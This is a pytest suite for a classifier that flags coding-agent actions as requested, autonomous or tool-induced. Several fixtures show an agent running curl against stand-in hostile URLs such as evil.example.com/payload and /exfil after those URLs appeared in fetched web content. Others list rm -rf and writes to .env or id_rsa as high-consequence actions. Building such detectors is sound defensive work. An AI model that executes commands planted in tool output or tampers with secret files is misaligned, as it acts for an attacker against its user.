"""Tests for src/unasked/classify.py — precision-first provenance classifier.

All fixtures built inline; no real ~/.claude reads, no real session data.
Covers the four F3b required axes:
  1. TRUE TOOL_INDUCED positive: result_entities → target match, not in task
  2. Anti-false-positive: read-then-edit helper.py must NOT be TOOL_INDUCED
  3. AUTONOMOUS / scope_drift
  4. REQUESTED (unflagged)
  5. scope_drift None when no task_text
  6. Feedback override
"""

from __future__ import annotations

import pytest

from unasked.classify import (
    classify_run,
    _bash_is_consequential,
    _bash_is_external_source,
    _is_external_source_decision,
    _is_high_consequence,
    _task_anchored,
    is_url_or_domain,
    WRITE_TOOLS,
    CONSEQUENTIAL_BASH_VERBS,
    BENIGN_BASH_VERBS,
    EXTERNAL_SOURCE_TOOLS,
    HIGH_CONSEQUENCE_BASH_VERBS,
)
from unasked.ir import Decision, Run


# ── Helpers ───────────────────────────────────────────────────────────────────

def _run(task: str | None, decisions: list[Decision]) -> Run:
    return Run(run_id="test-run", source="test", task_text=task, decisions=decisions)


def _dec(
    step: int,
    tool: str,
    targets: list[str],
    result_entities: list[str] | None = None,
    is_error: bool = False,
    **kwargs,
) -> Decision:
    return Decision(
        step_index=step,
        ts=None,
        tool_name=tool,
        tool_args_summary="",
        targets=targets,
        result_entities=result_entities or [],
        is_error=is_error,
        **kwargs,
    )


# ── _bash_is_consequential ────────────────────────────────────────────────────

class TestBashIsConsequential:
    def test_git_push_is_consequential(self):
        assert _bash_is_consequential("git push origin main") is True

    def test_git_commit_is_consequential(self):
        assert _bash_is_consequential("git commit -m 'fix'") is True

    def test_git_status_is_benign(self):
        assert _bash_is_consequential("git status") is False

    def test_git_diff_is_benign(self):
        assert _bash_is_consequential("git diff HEAD") is False

    def test_git_log_is_benign(self):
        assert _bash_is_consequential("git log --oneline") is False

    def test_rm_is_consequential(self):
        assert _bash_is_consequential("rm -rf dist/") is True

    def test_curl_is_consequential(self):
        assert _bash_is_consequential("curl https://example.com/api") is True

    def test_pytest_is_benign(self):
        assert _bash_is_consequential("pytest tests/") is False

    def test_ls_is_benign(self):
        assert _bash_is_consequential("ls -la") is False

    def test_grep_is_benign(self):
        assert _bash_is_consequential("grep -r 'auth' src/") is False

    def test_npm_publish_is_consequential(self):
        assert _bash_is_consequential("npm publish") is True

    def test_npm_install_is_benign(self):
        assert _bash_is_consequential("npm install") is False

    def test_unknown_verb_conservative(self):
        # Unknown verb → conservative: True
        assert _bash_is_consequential("deploy_script.sh --env prod") is True

    def test_empty_command(self):
        assert _bash_is_consequential("") is False


# ── TOOL_INDUCED (F3b primary requirement) ────────────────────────────────────

class TestToolInduced:
    def test_true_positive_url_in_result_then_fetched(self):
        """TRUE POSITIVE: WebFetch result contains a URL; next Bash curls that URL.
        The URL is not in task_text. Must be TOOL_INDUCED.
        """
        run = _run(
            "summarise the auth docs",
            [
                _dec(0, "WebFetch", ["https://docs.auth.com"],
                     result_entities=["https://evil.example.com/payload"]),
                _dec(1, "Bash", ["curl", "https://evil.example.com/payload"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED", (
            f"Expected TOOL_INDUCED, got {d.provenance}. "
            "An action targeting a URL from a prior result must be flagged."
        )

    def test_local_read_result_path_then_written_not_tool_induced(self):
        """F4.1/F4.2: Read result contains a local path; agent writes that path (not in task).
        TOOL_INDUCED must NOT fire — Read is a local source.
        F4.2: task 'fix auth bug' is NOT anchored (no file/path entities) → ordinary
        off-task Write → DERIVED (not AUTONOMOUS, not TOOL_INDUCED).
        """
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["docs/runbook.md"],
                     result_entities=["scripts/deploy.sh"]),
                _dec(1, "Write", ["scripts/deploy.sh"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED", (
            "F4.1: local Read result_entities must NEVER arm TOOL_INDUCED. "
            f"Got: {d.provenance}"
        )
        # F4.2: task not anchored → ordinary off-task write → DERIVED
        assert d.provenance != "TOOL_INDUCED"
        assert d.provenance in ("DERIVED", "AUTONOMOUS")  # AUTONOMOUS if task anchored

    def test_non_adjacent_prior_external_still_detected(self):
        """F4.1: Entity injected via WebFetch two steps back still triggers TOOL_INDUCED.
        External source (WebFetch) → result_entities contains a URL → target matches → TOOL_INDUCED.
        """
        run = _run(
            "fix auth bug",
            [
                _dec(0, "WebFetch", ["https://docs.example.com"],
                     result_entities=["https://evil.example.com/script"]),
                _dec(1, "Bash", ["pytest", "tests/"]),  # unrelated step
                _dec(2, "Bash", ["curl", "https://evil.example.com/script"]),
            ],
        )
        d = classify_run(run).decisions[2]
        assert d.provenance == "TOOL_INDUCED", (
            f"WebFetch result URL targeted two steps later must be TOOL_INDUCED. Got: {d.provenance}"
        )

    def test_non_adjacent_local_read_not_tool_induced(self):
        """F4.1: Local Read result with a local path two steps back does NOT trigger TOOL_INDUCED."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["docs/runbook.md"],
                     result_entities=["scripts/evil.sh"]),
                _dec(1, "Bash", ["pytest", "tests/"]),  # unrelated step
                _dec(2, "Bash", ["bash", "scripts/evil.sh"]),
            ],
        )
        d = classify_run(run).decisions[2]
        assert d.provenance != "TOOL_INDUCED", (
            f"F4.1: local Read result must not arm TOOL_INDUCED. Got: {d.provenance}"
        )

    def test_entity_in_task_not_tool_induced(self):
        """Entity in prior result_entities BUT also in task → NOT TOOL_INDUCED (REQUESTED)."""
        run = _run(
            "fix auth.py token bug",
            [
                _dec(0, "Read", ["auth.py"],
                     result_entities=["auth.py"]),
                _dec(1, "Edit", ["auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"
        assert d.provenance == "REQUESTED"

    def test_empty_result_entities_cannot_trigger(self):
        """No result_entities on prior step → TOOL_INDUCED cannot fire."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["docs/runbook.md"], result_entities=[]),
                _dec(1, "Write", ["scripts/deploy.sh"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"

    def test_tool_induced_has_why(self):
        """TOOL_INDUCED decision carries a non-empty why string."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "WebFetch", ["https://docs.example.com"],
                     result_entities=["scripts/deploy.sh"]),
                _dec(1, "Write", ["scripts/deploy.sh"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.why and len(d.why) > 0


# ── Anti-false-positive: read-then-edit (F3b regression test) ────────────────

class TestReadThenEditAntiFalsePositive:
    def test_read_helper_then_edit_helper_not_tool_induced(self):
        """F3b/F4.2 REGRESSION TEST: Read src/helper.py (result = ordinary code,
        no external URLs/paths), then Edit src/helper.py.

        The old token-overlap proxy falsely flagged this as TOOL_INDUCED.
        The new rule only fires when the Edit's TARGET appeared in the Read's
        RESULT CONTENT as a URL/domain from an external source.

        F4.2: task 'fix auth bug' is NOT anchored (no file/path entities).
        helper.py is off-task and ordinary → falls to DERIVED (not AUTONOMOUS,
        not TOOL_INDUCED). If task were anchored (e.g. 'fix src/auth.py'), the
        edit would be AUTONOMOUS.
        """
        run = _run(
            "fix auth bug",
            [
                # result_entities = code tokens from helper.py, NOT the file path
                _dec(0, "Read", ["src/helper.py"],
                     result_entities=["def helper_func", "return result"]),
                _dec(1, "Edit", ["src/helper.py"]),
            ],
        )
        result = classify_run(run)
        d = result.decisions[1]

        assert d.provenance != "TOOL_INDUCED", (
            "Read-then-edit of the same file must NEVER be TOOL_INDUCED. "
            "This is the F3b regression the fix was designed to prevent. "
            f"Got: {d.provenance} (why: {d.why})"
        )
        # F4.2: task not anchored → ordinary off-task edit → DERIVED
        assert d.provenance in ("DERIVED", "AUTONOMOUS"), (
            f"Expected DERIVED (vague task) or AUTONOMOUS (anchored task), got {d.provenance}"
        )

    def test_read_task_file_then_edit_not_tool_induced(self):
        """Read auth.py (in task), ordinary code result → Edit auth.py: REQUESTED."""
        run = _run(
            "fix auth.py token expiry",
            [
                _dec(0, "Read", ["auth.py"],
                     result_entities=["def validate_token", "return True"]),
                _dec(1, "Edit", ["auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED"
        assert d.provenance == "REQUESTED"

    def test_grep_result_contains_file_then_read_is_not_flagged(self):
        """Bash grep (benign, non-external) → result mentions auth.py.
        Next Read of auth.py (in task) → REQUESTED, not TOOL_INDUCED.
        """
        run = _run(
            "fix auth.py bug",
            [
                _dec(0, "Bash", ["grep", "-r", "auth", "src/"],
                     result_entities=["src/auth.py"]),
                _dec(1, "Read", ["src/auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        # auth.py is in task → REQUESTED takes priority over TOOL_INDUCED
        assert d.provenance != "TOOL_INDUCED"


# ── REQUESTED (unflagged, routine) ────────────────────────────────────────────

class TestRequested:
    def test_edit_task_file(self):
        """Task names auth.py; Edit auth.py → REQUESTED."""
        run = _run(
            "fix auth.py token expiry",
            [_dec(0, "Edit", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "REQUESTED"

    def test_read_task_file(self):
        """Read is non-consequential; target in task → REQUESTED."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Read", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "REQUESTED"

    def test_pytest_when_asked_not_autonomous(self):
        """pytest tests/ when task says 'run tests' → NOT AUTONOMOUS."""
        run = _run(
            "run tests for auth",
            [_dec(0, "Bash", ["pytest", "tests/"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS", (
            "Running tests when asked to run tests must not be AUTONOMOUS."
        )

    def test_requested_no_scope_drift(self):
        """Requested edit on task-named file → scope_drift False."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Edit", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is False


# ── AUTONOMOUS + scope_drift ──────────────────────────────────────────────────

class TestAutonomous:
    def test_git_push_not_in_task(self):
        """git push not in task 'fix auth bug' → AUTONOMOUS."""
        run = _run(
            "fix auth bug",
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"

    def test_edit_unrelated_file(self):
        """Edit config/db.yaml when task is about auth.py → AUTONOMOUS + scope_drift."""
        run = _run(
            "fix auth.py token expiry",
            [_dec(0, "Edit", ["config/db.yaml"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS"
        assert d.scope_drift is True

    def test_autonomous_errored_not_flagged(self):
        """An errored consequential action is NOT flagged AUTONOMOUS (less alarming)."""
        run = _run(
            "fix auth bug",
            [_dec(0, "Bash", ["git", "push", "origin", "main"], is_error=True)],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS"

    def test_read_not_autonomous(self):
        """Read is non-consequential — off-task reads must NOT be AUTONOMOUS."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Read", ["src/unrelated.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS", (
            "Non-consequential reads must never be AUTONOMOUS — anti-cry-wolf."
        )

    def test_autonomous_has_why(self):
        run = _run(
            "fix auth bug",
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.why and len(d.why) > 0


# ── scope_drift ───────────────────────────────────────────────────────────────

class TestScopeDrift:
    def test_none_when_no_task_text(self):
        """scope_drift must be None when task_text is absent."""
        run = _run(
            None,
            [
                _dec(0, "Edit", ["auth.py"]),
                _dec(1, "Edit", ["config/db.yaml"]),
                _dec(2, "Bash", ["git", "push"]),
            ],
        )
        result = classify_run(run)
        for d in result.decisions:
            assert d.scope_drift is None, (
                f"step {d.step_index}: scope_drift should be None without task_text, "
                f"got {d.scope_drift}"
            )

    def test_false_for_non_consequential(self):
        """Read is not consequential → scope_drift False even if off-task."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Read", ["config/db.yaml"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is False

    def test_true_for_consequential_off_task_path(self):
        """Edit to a top-level dir not in task_entities → scope_drift True."""
        run = _run(
            "fix auth.py token expiry",
            [_dec(0, "Edit", ["config/db.yaml"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is True

    def test_false_when_target_in_task(self):
        """Edit auth.py when task is about auth.py → scope_drift False."""
        run = _run(
            "fix auth.py",
            [_dec(0, "Edit", ["auth.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.scope_drift is False


# ── Feedback override ─────────────────────────────────────────────────────────

class TestFeedbackOverride:
    def test_feedback_skips_classification(self):
        """Decision with feedback set must not be reclassified."""
        dec = _dec(0, "Bash", ["git", "push", "origin", "main"],
                   feedback="approved-push")
        run = _run("fix auth bug", [dec])
        result = classify_run(run)
        d = result.decisions[0]
        assert d.provenance is None   # not set by classifier
        assert d.feedback == "approved-push"

    def test_only_feedback_decision_skipped(self):
        """Only feedback-annotated decision skipped; others classified normally."""
        run = _run(
            "fix auth bug",
            [
                _dec(0, "Read", ["auth.py"], feedback="ok"),
                _dec(1, "Bash", ["git", "push", "origin", "main"]),
            ],
        )
        result = classify_run(run)
        assert result.decisions[0].provenance is None   # skipped
        assert result.decisions[1].provenance == "AUTONOMOUS"  # classified


# ── DERIVED (default, unflagged) ──────────────────────────────────────────────

class TestDerived:
    def test_no_task_text_defaults_derived(self):
        """Without task_text, non-consequential first step → DERIVED."""
        run = _run(None, [_dec(0, "Read", ["auth.py"])])
        d = classify_run(run).decisions[0]
        assert d.provenance == "DERIVED"

    def test_glob_is_not_autonomous(self):
        """Glob is non-consequential and exploratory → not AUTONOMOUS."""
        run = _run(
            "fix auth bug",
            [_dec(0, "Glob", ["src/**/*.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS"

    def test_classify_run_mutates_in_place(self):
        """classify_run mutates decisions in-place and returns the SAME Run object."""
        run = _run("fix auth.py", [_dec(0, "Read", ["auth.py"])])
        result = classify_run(run)
        assert result is run
        assert run.decisions[0].provenance is not None


# ── F4.1: is_url_or_domain helper ────────────────────────────────────────────

class TestIsUrlOrDomain:
    def test_https_url_is_true(self):
        assert is_url_or_domain("https://evil.example.com/payload") is True

    def test_http_url_is_true(self):
        assert is_url_or_domain("http://example.com") is True

    def test_bare_domain_is_true(self):
        assert is_url_or_domain("evil.example.com") is True

    def test_domain_with_path_is_true(self):
        assert is_url_or_domain("api.example.com/v1") is True

    def test_local_abs_path_is_false(self):
        assert is_url_or_domain("/home/user/project/file.py") is False

    def test_local_rel_path_is_false(self):
        assert is_url_or_domain("src/auth.py") is False

    def test_plain_filename_is_false(self):
        assert is_url_or_domain("deploy.sh") is False

    def test_plain_string_is_false(self):
        assert is_url_or_domain("some-token") is False


# ── F4.1: EXTERNAL_SOURCE_TOOLS constant ─────────────────────────────────────

class TestExternalSourceTools:
    def test_webfetch_in_external_source_tools(self):
        assert "WebFetch" in EXTERNAL_SOURCE_TOOLS

    def test_websearch_in_external_source_tools(self):
        assert "WebSearch" in EXTERNAL_SOURCE_TOOLS

    def test_read_not_in_external_source_tools(self):
        assert "Read" not in EXTERNAL_SOURCE_TOOLS

    def test_bash_not_in_external_source_tools(self):
        assert "Bash" not in EXTERNAL_SOURCE_TOOLS


# ── F4.1: TOOL_INDUCED precision — external-source-only arming ───────────────

class TestToolInducedF41:
    def test_true_positive_webfetch_url_in_result(self):
        """TRUE POSITIVE: WebFetch result → URL → next Bash curls that URL → TOOL_INDUCED."""
        run = _run(
            "summarise the auth docs",
            [
                _dec(0, "WebFetch", ["https://docs.auth.com"],
                     result_entities=["https://evil.example.com/payload"]),
                _dec(1, "Bash", ["curl", "https://evil.example.com/payload"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"

    def test_true_positive_websearch_url_in_result(self):
        """TRUE POSITIVE: WebSearch result → URL → next action targets URL → TOOL_INDUCED."""
        run = _run(
            "check the changelog",
            [
                _dec(0, "WebSearch", ["changelog", "release"],
                     result_entities=["https://evil.example.com/exfil"]),
                _dec(1, "Bash", ["curl", "https://evil.example.com/exfil"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED", (
            f"WebSearch result URL targeted by Bash must be TOOL_INDUCED. Got: {d.provenance}"
        )

    def test_true_positive_bash_curl_result_url(self):
        """TRUE POSITIVE: Bash curl result → URL → next action targets URL → TOOL_INDUCED."""
        run = _run(
            "check the service",
            [
                _dec(0, "Bash", ["curl", "https://service.example.com"],
                     result_entities=["https://redirect.evil.com/hook"]),
                _dec(1, "Bash", ["curl", "https://redirect.evil.com/hook"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"

    def test_local_read_then_edit_not_tool_induced(self):
        """F4.1 KEY: local Read(src/a.py) result contains src/b.py → Edit(src/b.py).
        MUST NOT be TOOL_INDUCED — source is local Read, not external.
        """
        run = _run(
            "refactor the parser",
            [
                _dec(0, "Read", ["src/a.py"],
                     result_entities=["src/b.py"]),
                _dec(1, "Edit", ["src/b.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED", (
            f"F4.1: local Read result_entities must never arm TOOL_INDUCED. Got: {d.provenance}"
        )
        # src/b.py is in task ("parser" → DERIVED or AUTONOMOUS depending on match)
        # Regardless, never TOOL_INDUCED
        assert d.provenance in ("AUTONOMOUS", "REQUESTED", "DERIVED")

    def test_external_source_but_local_path_entity_not_tool_induced(self):
        """F4.1: External source (WebFetch) result contains a local path (not URL/domain).
        The entity fails is_url_or_domain() → TOOL_INDUCED must NOT fire.
        """
        run = _run(
            "fix auth bug",
            [
                _dec(0, "WebFetch", ["https://docs.example.com"],
                     result_entities=["src/config.py"]),
                _dec(1, "Edit", ["src/config.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED", (
            f"F4.1: even if source is external, a local-path entity must not arm TOOL_INDUCED. "
            f"Got: {d.provenance}"
        )

    def test_bash_grep_result_path_then_read_not_tool_induced(self):
        """F4.1: Bash grep (local, benign) result contains a path; Read of that path.
        TOOL_INDUCED must NOT fire — grep is a local source.
        """
        run = _run(
            "explore the codebase",
            [
                _dec(0, "Bash", ["grep", "-r", "import", "src/"],
                     result_entities=["src/auth.py", "src/models.py"]),
                _dec(1, "Read", ["src/auth.py"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance != "TOOL_INDUCED", (
            f"F4.1: grep result_entities must never arm TOOL_INDUCED. Got: {d.provenance}"
        )


# ── F4.1/F4.2: AUTONOMOUS suppression when no task ───────────────────────────

class TestNoTaskAutonomousSuppressed:
    def test_ordinary_consequential_no_task_not_autonomous(self):
        """F4.1/F4.2: With no task_text, ORDINARY consequential action must NOT be AUTONOMOUS.
        Edit to a non-secret file with no task → DERIVED.
        """
        run = _run(
            None,
            [_dec(0, "Edit", ["src/models.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS", (
            f"F4.1: ordinary AUTONOMOUS must not fire without task_text. Got: {d.provenance}"
        )
        assert d.provenance == "DERIVED"

    def test_high_consequence_no_task_still_autonomous(self):
        """F4.2: HIGH_CONSEQUENCE (git push) fires AUTONOMOUS even with no task_text.
        A git push with no stated task is exactly what you want surfaced.
        """
        run = _run(
            None,
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS", (
            f"F4.2: git push must be AUTONOMOUS even with no task. Got: {d.provenance}"
        )

    def test_ordinary_consequential_no_task_all_derived(self):
        """F4.1/F4.2: Ordinary actions with no task → zero AUTONOMOUS flags."""
        run = _run(
            None,
            [
                _dec(0, "Edit", ["config/db.yaml"]),
                _dec(1, "Write", ["src/models.py"]),
            ],
        )
        classify_run(run)
        autonomous_count = sum(
            1 for d in run.decisions if d.provenance == "AUTONOMOUS"
        )
        assert autonomous_count == 0, (
            f"F4.1: expected 0 AUTONOMOUS for ordinary actions with no task, got {autonomous_count}"
        )

    def test_tool_induced_still_fires_with_no_task(self):
        """F4.1: TOOL_INDUCED is task-independent — can fire even with no task_text."""
        run = _run(
            None,
            [
                _dec(0, "WebFetch", ["https://docs.example.com"],
                     result_entities=["https://evil.example.com/hook"]),
                _dec(1, "Bash", ["curl", "https://evil.example.com/hook"]),
            ],
        )
        d = classify_run(run).decisions[1]
        assert d.provenance == "TOOL_INDUCED"


# ── F4.2: _task_anchored helper ───────────────────────────────────────────────

class TestTaskAnchored:
    def test_file_path_entity_is_anchored(self):
        """Entity with slash → anchored."""
        assert _task_anchored(["src/auth.py"]) is True

    def test_dotted_code_extension_is_anchored(self):
        """Entity with .py extension → anchored."""
        assert _task_anchored(["auth.py"]) is True

    def test_known_src_dir_stem_is_anchored(self):
        """Entity starting with known dir stem (src, lib, tests…) → anchored."""
        assert _task_anchored(["src"]) is True
        assert _task_anchored(["tests"]) is True
        assert _task_anchored(["lib"]) is True

    def test_vague_prose_not_anchored(self):
        """Pure prose tokens with no file/path signal → not anchored."""
        assert _task_anchored(["focus", "sprint", "goals", "delivery"]) is False

    def test_empty_entities_not_anchored(self):
        assert _task_anchored([]) is False

    def test_mixed_anchors_one_sufficient(self):
        """Any single anchor is enough."""
        assert _task_anchored(["refactor", "auth.py", "tomorrow"]) is True


# ── F4.2: _is_high_consequence helper ────────────────────────────────────────

class TestIsHighConsequence:
    def test_git_push_is_high_consequence(self):
        dec = _dec(0, "Bash", ["git", "push", "origin", "main"])
        assert _is_high_consequence(dec) is True

    def test_git_reset_is_high_consequence(self):
        dec = _dec(0, "Bash", ["git", "reset", "--hard", "HEAD~1"])
        assert _is_high_consequence(dec) is True

    def test_rm_is_high_consequence(self):
        dec = _dec(0, "Bash", ["rm", "-rf", "dist/"])
        assert _is_high_consequence(dec) is True

    def test_curl_is_high_consequence(self):
        dec = _dec(0, "Bash", ["curl", "https://example.com/api"])
        assert _is_high_consequence(dec) is True

    def test_docker_is_high_consequence(self):
        dec = _dec(0, "Bash", ["docker", "push", "myimage:latest"])
        assert _is_high_consequence(dec) is True

    def test_git_status_not_high_consequence(self):
        dec = _dec(0, "Bash", ["git", "status"])
        assert _is_high_consequence(dec) is False

    def test_git_log_not_high_consequence(self):
        dec = _dec(0, "Bash", ["git", "log", "--oneline"])
        assert _is_high_consequence(dec) is False

    def test_edit_normal_file_not_high_consequence(self):
        dec = _dec(0, "Edit", ["src/auth.py"])
        assert _is_high_consequence(dec) is False

    def test_write_env_file_is_high_consequence(self):
        """Write to .env is HIGH_CONSEQUENCE (secret file)."""
        dec = _dec(0, "Write", [".env"])
        assert _is_high_consequence(dec) is True

    def test_edit_env_local_is_high_consequence(self):
        """Edit .env.local is HIGH_CONSEQUENCE."""
        dec = _dec(0, "Edit", [".env.local"])
        assert _is_high_consequence(dec) is True

    def test_write_pem_file_is_high_consequence(self):
        """Write to a .pem file is HIGH_CONSEQUENCE."""
        dec = _dec(0, "Write", ["certs/server.pem"])
        assert _is_high_consequence(dec) is True

    def test_write_id_rsa_is_high_consequence(self):
        """Write to id_rsa is HIGH_CONSEQUENCE."""
        dec = _dec(0, "Write", ["/home/user/.ssh/id_rsa"])
        assert _is_high_consequence(dec) is True


# ── F4.2: two-tier AUTONOMOUS integration ────────────────────────────────────

class TestAutonomousF42:
    def test_git_push_autonomous_with_vague_task(self):
        """F4.2 TIER 1: git push (HIGH_CONSEQUENCE) flagged even on vague/unanchored task."""
        run = _run(
            "things I want to focus on this sprint",
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS", (
            f"F4.2: git push must be AUTONOMOUS even on vague task. Got: {d.provenance}"
        )

    def test_git_push_autonomous_with_no_task(self):
        """F4.2 TIER 1: git push (HIGH_CONSEQUENCE) flagged even with task_text None."""
        run = _run(
            None,
            [_dec(0, "Bash", ["git", "push", "origin", "main"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS", (
            f"F4.2: git push must be AUTONOMOUS even with no task. Got: {d.provenance}"
        )

    def test_vague_task_off_task_edit_not_autonomous(self):
        """F4.2 KEY REGRESSION: vague prose task + off-task Edit → DERIVED, not AUTONOMOUS.
        A vague task has no anchors → we can't credibly claim the edit is 'off-task'.
        """
        run = _run(
            "things I want to focus on this sprint",
            [_dec(0, "Edit", ["src/x.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance != "AUTONOMOUS", (
            f"F4.2: off-task Edit on vague task must NOT be AUTONOMOUS. Got: {d.provenance}"
        )
        assert d.provenance == "DERIVED"

    def test_anchored_task_off_task_edit_is_autonomous(self):
        """F4.2 TIER 2: anchored task (names src/auth.py) + off-task Edit → AUTONOMOUS."""
        run = _run(
            "fix the token bug in src/auth.py",
            [_dec(0, "Edit", ["src/other.py"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS", (
            f"F4.2: off-task edit when task is anchored must be AUTONOMOUS. Got: {d.provenance}"
        )

    def test_env_file_write_autonomous_regardless_of_task(self):
        """F4.2 TIER 1: Write to .env is HIGH_CONSEQUENCE → AUTONOMOUS even on vague task."""
        run = _run(
            "focus on delivery",
            [_dec(0, "Write", [".env"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS", (
            f"F4.2: .env write must be AUTONOMOUS regardless of task vagueness. Got: {d.provenance}"
        )

    def test_rm_autonomous_with_vague_task(self):
        """F4.2 TIER 1: rm command is HIGH_CONSEQUENCE → AUTONOMOUS on vague task."""
        run = _run(
            "clean things up a bit",
            [_dec(0, "Bash", ["rm", "-rf", "dist/"])],
        )
        d = classify_run(run).decisions[0]
        assert d.provenance == "AUTONOMOUS", (
            f"F4.2: rm must be AUTONOMOUS even on vague task. Got: {d.provenance}"
        )
